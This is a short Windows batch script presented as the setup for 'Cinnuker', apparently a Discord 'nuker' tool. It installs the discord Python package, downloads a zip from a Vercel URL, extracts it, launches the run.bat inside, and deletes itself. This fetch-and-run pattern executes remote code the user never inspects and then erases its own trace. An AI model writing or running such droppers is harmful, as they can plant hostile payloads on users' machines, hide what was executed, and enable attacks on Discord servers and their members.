@echo off
title Cinnuker Setup
color 0a

echo [INFO] Installing required Python packages...
py -m ensurepip
py -m pip install --upgrade pip
py -m pip install discord

echo [INFO] Downloading project zip...
powershell -Command "Invoke-WebRequest -Uri 'https://cinnuker-project-nug1aawee-cinaxs-projects-31cda09b.vercel.app/cinnuker.zip' -OutFile 'cinnuker.zip'"

if exist "cinnuker.zip" (
    powershell -Command "Expand-Archive -Force 'cinnuker.zip' '.'"
    del "cinnuker.zip"
) else (
    echo [ERROR] Download failed.
    pause
    exit /b 1
)

echo [INFO] Setup complete. Launching run.bat...
start run.bat

echo [INFO] Deleting installer...
del "%~f0"
